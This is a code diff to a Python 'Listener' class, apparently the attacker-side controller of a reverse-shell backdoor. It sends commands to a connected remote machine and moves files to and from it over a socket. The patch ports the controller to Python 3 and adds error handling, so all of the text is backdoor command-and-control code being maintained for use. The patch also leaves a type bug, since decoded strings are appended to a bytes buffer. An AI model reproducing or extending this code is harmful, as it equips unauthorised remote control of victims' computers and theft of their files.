@@ -18,10 +18,10 @@ class Listener:
 
     def send_json(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def receive_json(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024).decode()
@@ -30,8 +30,13 @@ class Listener:
                 continue
     #upload_file
     def read_file(self, path):
-        with open(path,"rb") as file:
-            return b64.b64encode(file.read())
+        try:
+            with open(path,"rb") as file:
+                return b64.b64encode(file.read())
+        except Exception as e:
+            print(e)
+            return "Error"
+
     #download_file
     def write_file(self, path, content):
         with open(path,'wb') as file:
@@ -52,7 +57,10 @@ class Listener:
         elif(command[0].lower() == "upload"):
             command.append(self.read_file(command[1]))
             # upload = [command[0] ,fileName, upload_file]
-            self.send_json(command)
+            if("Error" in command):
+                return "\n"
+            else:
+                self.send_json(command)
 
         else:
             self.send_json(command)
@@ -61,7 +69,7 @@ class Listener:
 
     def run(self):
         while True:
-            command = raw_input(">> ")
+            command = input(">> ")
             command = command.split(" ")
             result = self.execute_remotely(command)
 
